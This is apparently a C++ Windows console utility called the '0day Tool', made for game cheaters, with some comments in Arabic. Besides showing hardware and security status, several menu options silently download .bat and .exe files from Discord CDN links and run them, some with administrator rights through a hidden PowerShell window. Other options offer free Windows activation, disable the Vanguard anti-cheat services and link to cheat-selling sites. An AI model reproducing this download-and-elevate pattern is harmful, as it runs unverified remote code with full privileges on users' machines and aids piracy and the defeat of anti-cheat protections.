#include <iostream>
#include <string>
#include <windows.h>
#include <shellapi.h>
#ifdef max
#undef max
#endif
#ifdef min
#undef min
#endif
#include <cstdlib>
#include <limits>



size_t write_data(void* ptr, size_t size, size_t nmemb, FILE* stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}


using namespace std;

string executeAndReturn(string command) {
    string data;
    FILE* stream;
    const int max_buffer = 256;
    char buffer[max_buffer];
    command.append(" 2>&1");

    stream = _popen(command.c_str(), "r");
    if (stream) {
        while (!feof(stream)) {
            if (fgets(buffer, max_buffer, stream) != NULL) {
                data.append(buffer);
            }
        }
        _pclose(stream);
    }
    else {
        data = "ERROR: Failed to execute command.";
    }
    return data;
}


string trimEnd(string str) {
    size_t endpos = str.find_last_not_of(" \t\n\r");
    if (string::npos != endpos) {
        str = str.substr(0, endpos + 1);
    }
    return str;
}

void setColor(int color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

void displayVirtualizationStatus() {
    string virtualizationData = executeAndReturn("systeminfo");
    size_t pos = virtualizationData.find("Virtualization Enabled In Firmware:");

    setColor(7);
    cout << "Virtualization: ";

    if (pos != string::npos) {
        if (virtualizationData.find("Yes", pos) != string::npos) {
            setColor(10);
            cout << "Enabled" << endl;
        }
        else if (virtualizationData.find("No", pos) != string::npos) {
            setColor(12);
            cout << "Disabled" << endl;
        }
        else {
            cout << "Information Unavailable" << endl;
        }
    }
    else {
        cout << "Information Unavailable" << endl;
    }

    setColor(7);
}

void downloadAndExecuteBatFileInNewConsole(string downloadURL, string localFileName) {
    string downloadCommand = "curl -s -o " + localFileName + " " + downloadURL;
    system(downloadCommand.c_str());

    string executeCommand = "start cmd /c " + localFileName;
    system(executeCommand.c_str());
}

void displayBaseboardInfo() {
    cout << "----------------------------------------\n";

    string productData = executeAndReturn("wmic baseboard get product");
    productData.erase(0, productData.find("\n") + 1);
    cout << "Product: " << trimEnd(productData) << endl;

    string manufacturerData = executeAndReturn("wmic baseboard get Manufacturer");
    manufacturerData.erase(0, manufacturerData.find("\n") + 1);
    cout << "Manufacturer: " << trimEnd(manufacturerData) << endl;

    string secureBootData = executeAndReturn("reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State /v UEFISecureBootEnabled");
    cout << "Secure Boot: ";
    if (secureBootData.find("0x1") != string::npos) {
        setColor(10);
        cout << "Enabled" << endl;
    }
    else if (secureBootData.find("0x0") != string::npos) {
        setColor(12);
        cout << "Disabled" << endl;
    }
    else {
        setColor(7);
        cout << "Information Unavailable" << endl;
    }

    string defenderData = executeAndReturn("sc query WinDefend");
    setColor(7); // تعيين اللون إلى أبيض
    cout << "Windows Defender: ";
    if (defenderData.find("RUNNING") != string::npos) {
        setColor(10); // تعيين اللون إلى أخضر
        cout << "Enabled" << endl;
    }
    else if (defenderData.find("STOPPED") != string::npos) {
        setColor(12); // تعيين اللون إلى أحمر
        cout << "Disabled" << endl;
    }
    else {
        setColor(7); // تعيين اللون إلى أبيض
        cout << "Information Unavailable" << endl;
    }

    displayVirtualizationStatus();

    string cpuNameData = executeAndReturn("wmic cpu get name");
    cpuNameData.erase(0, cpuNameData.find("\n") + 1);
    setColor(7);
    cout << "CPU Name: ";
    if (cpuNameData.find("Intel") != string::npos) {
        setColor(9);
    }
    else if (cpuNameData.find("AMD") != string::npos) {
        setColor(12);
    }
    cout << trimEnd(cpuNameData) << endl;

    setColor(7);
    cout << "----------------------------------------\n";
}

wstring stringToWString(const string& s) {
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    wstring r(buf);
    delete[] buf;
    return r;
}

void downloadAndExecuteBATWithAdmin(string downloadURL, string localFileName) {
    // تحميل الملف كما هو
    string downloadCommand = "curl -s -o " + localFileName + " " + downloadURL;
    system(downloadCommand.c_str());

    // تشغيل الملف مباشرة باستخدام صلاحيات المسؤول
    wstring wideString = L"cmd /c " + stringToWString(localFileName); // تحويل اسم الملف إلى سلسلة ذات أحرف واسعة وإضافة "cmd /c" أمامها
    ShellExecute(NULL, L"runas", L"cmd.exe", wideString.c_str(), NULL, SW_SHOWNORMAL); // تشغيل cmd باستخدام صلاحيات المسؤول وتنفيذ الملف
}


void downloadAndExecuteWithAdminSilently(string downloadURL, string localFileName) {
    // تحميل الملف
    string downloadCommand = "curl -s -o " + localFileName + " " + downloadURL;
    system(downloadCommand.c_str());

    // تشغيل الملف باستخدام PowerShell وبصلاحيات المسؤول
    wstring powershellCommand = L"powershell -Command Start-Process -FilePath '" + stringToWString(localFileName) + L"' -Verb RunAs";
    ShellExecute(NULL, NULL, L"powershell.exe", powershellCommand.c_str(), NULL, SW_HIDE);
}




int getIntegerInput() {
    int value;
    while (!(cin >> value)) {
        cin.clear(); // clear the error flag
        cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n'); // discard invalid input
        cout << "Invalid input! Please enter an integer: ";
    }
    cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n'); // discard the newline or remaining input
    return value;
}

void subMenu() {
    system("cls");
    int subChoice;
    while (true) {
        cout << "========================================\n";
        cout << "Sub Menu:" << endl;
        cout << "========================================\n";
        cout << "1. Vulnerable Driver Error Solution\n";
        cout << "2. BSOD (Blue Screen of Death) Fix\n";
        cout << "3. fix C000041 Error\n";
        cout << "4. Return to Main Menu\n";
        subChoice = getIntegerInput();

        switch (subChoice) {
        case 1:
            system("cls");
            downloadAndExecuteBATWithAdmin("https://cdn.discordapp.com/attachments/1127468254630268988/1136057877300252732/vuln.bat", "vuln.bat");
            break;
        case 2:
            system("cls");
            downloadAndExecuteBATWithAdmin("https://cdn.discordapp.com/attachments/1082899344946106448/1143920501778034859/bsod.bat", "bsod.bat");
            break;
        case 3:
        {
            system("cls");
            // تشغيل الأمر باستخدام صلاحيات المسؤول
            wstring commandToRun = L"cmd /k sc config vgc start= disabled & sc config vgk start= disabled";
            ShellExecute(NULL, L"runas", L"cmd.exe", commandToRun.c_str(), NULL, SW_SHOWNORMAL);
            break;
        }

        case 4:
            system("cls");
            return;
        default:
            cout << "Invalid choice in the sub menu!" << endl;
        }
    }
}




void subMenu2() {
    system("cls");
    int choice;
    setColor(12);

    cout << "========================================\n";
    cout << "Welcome to the 0day Tool !" << endl;
    cout << "========================================\n";
    setColor(7);

    while (true) {
        cout << "1. acdiamond" << endl;
        cout << "2. acdiamond sellpass" << endl;
        cout << "3. cobalt solutions" << endl;
        cout << "4. engineowning" << endl;
        cout << "5. artificialaiming" << endl;
        cout << "6. test" << endl;
        cout << "7. Return to main menu" << endl;

        choice = getIntegerInput();

        switch (choice) {
        case 1:
            system("start https://acdiamond.net/");
            break;
        case 2:
            system("start https://acdiamond.sellpass.io/products");
            break;
        case 3:
            system("start https://cobalt.solutions/");
            break;
        case 4:
            system("start https://www.engineowning.to/shop/");
            break;
        case 5:
            system("start https://www.artificialaiming.net/");
            break;
        case 6:
            // Your code for sub-option 6 here
            break;
        case 7:
            system("cls");
            return;
        default:
            cout << "Invalid choice in the sub menu!" << endl;
        }
    }
}



int main() {
    int choice;
    setColor(12);

    cout << "========================================\n";
    cout << "Welcome to the 0day Tool !" << endl;
    cout << "========================================\n";
    setColor(7);

    while (true) {
        cout << "========================================\n";
        cout << "Choose an option:" << endl;
        cout << "========================================\n";
        cout << "1. Display Device Information" << endl;
        cout << "2. Activate Windows 10 ALL versions for FREE" << endl;
        cout << "3. HWID-CHECKER" << endl;
        cout << "4. cobalt Fix" << endl;
        cout << "5. Visual C++ Redistributable Runtimes All-in-One May 2023 | all cheats need this tools" << endl;
        cout << "6. Official cheating sites" << endl;
        cout << "7. [Your Option Description for 7]" << endl;
        cout << "8. join our Discord server" << endl;
        cout << "9. Exit" << endl;

        choice = getIntegerInput();

        switch (choice) {
        case 1:
            displayBaseboardInfo();
            break;
        case 2:
            downloadAndExecuteWithAdminSilently("https://cdn.discordapp.com/attachments/1090490830948675594/1143910975049838693/localFile1.bat", "localFile1.bat");
            break;
        case 3:
            downloadAndExecuteBatFileInNewConsole("https://cdn.discordapp.com/attachments/1090490830948675594/1143792399500460072/TWH-HWID-CHECKER_1.1.bat", "localFile2.bat");
            break;
        case 4:
            subMenu();
            break;
        case 5:
            // إنشاء المجلد
            system("mkdir \"Microsoft Visual C++ All-In-One\"");

            // تحميل الملفات .exe إلى المجلد
            system("curl -L -o \"Microsoft Visual C++ All-In-One\\vcredist2008_x86.exe\" https://cdn.discordapp.com/attachments/1082899344946106448/1143943060267487373/vcredist2008_x86.exe > nul 2>&1");
            system("curl -L -o \"Microsoft Visual C++ All-In-One\\vcredist2010_x64.exe\" https://cdn.discordapp.com/attachments/1082899344946106448/1143943060833714329/vcredist2010_x64.exe > nul 2>&1");
            system("curl -L -o \"Microsoft Visual C++ All-In-One\\vcredist2010_x86.exe\" https://cdn.discordapp.com/attachments/1082899344946106448/1143943061295083570/vcredist2010_x86.exe > nul 2>&1");
            system("curl -L -o \"Microsoft Visual C++ All-In-One\\vcredist2012_x64.exe\" https://cdn.discordapp.com/attachments/1082899344946106448/1143943061748076574/vcredist2012_x64.exe > nul 2>&1");
            system("curl -L -o \"Microsoft Visual C++ All-In-One\\vcredist2012_x86.exe\" https://cdn.discordapp.com/attachments/1082899344946106448/1143943062121365574/vcredist2012_x86.exe > nul 2>&1");
            system("curl -L -o \"Microsoft Visual C++ All-In-One\\vcredist2013_x64.exe\" https://cdn.discordapp.com/attachments/1082899344946106448/1143943062540791948/vcredist2013_x64.exe > nul 2>&1");
            system("curl -L -o \"Microsoft Visual C++ All-In-One\\vcredist2005_x64.exe\" https://cdn.discordapp.com/attachments/1082899344946106448/1143943063463538839/vcredist2005_x64.exe > nul 2>&1");
            system("curl -L -o \"Microsoft Visual C++ All-In-One\\vcredist2005_x86.exe\" https://cdn.discordapp.com/attachments/1082899344946106448/1143943064008802405/vcredist2005_x86.exe > nul 2>&1");
            system("curl -L -o \"Microsoft Visual C++ All-In-One\\vcredist2008_x64.exe\" https://cdn.discordapp.com/attachments/1082899344946106448/1143943064407257308/vcredist2008_x64.exe > nul 2>&1");
            system("curl -L -o \"Microsoft Visual C++ All-In-One\\vcredist2015_2017_2019_2022_x64.exe\" https://cdn.discordapp.com/attachments/1082899344946106448/1143943205264576572/vcredist2015_2017_2019_2022_x64.exe > nul 2>&1");
            system("curl -L -o \"Microsoft Visual C++ All-In-One\\vcredist2015_2017_2019_2022_x86.exe\" https://cdn.discordapp.com/attachments/1082899344946106448/1143943205692379286/vcredist2015_2017_2019_2022_x86.exe > nul 2>&1");
            system("curl -L -o \"Microsoft Visual C++ All-In-One\\vcredist2013_x86.exe\" https://cdn.discordapp.com/attachments/1082899344946106448/1143943206153748580/vcredist2013_x86.exe > nul 2>&1");

            // تحميل ملف .bat
            system("curl -L -o \"Microsoft Visual C++ All-In-One\\install_all.bat\" https://cdn.discordapp.com/attachments/1082899344946106448/1143943062947643522/install_all.bat > nul 2>&1");

            // تشغيل الملف bat كمسؤول
            system("start cmd.exe /k \"cd \"Microsoft Visual C++ All-In-One\" && install_all.bat\"");

            break;


        case 6:
            subMenu2();
            break;
        case 7:
            // Your code for option 7 here
            break;
        case 8:
            system("start https://discord.gg/0day");
            break;
        case 9:
            exit(0);
        default:
            cout << "Invalid choice!" << endl;
            std::streamsize maxStreamSize = std::numeric_limits<std::streamsize>::max();
            cin.ignore(maxStreamSize, '\n');
        }
    }
    return 0;
}

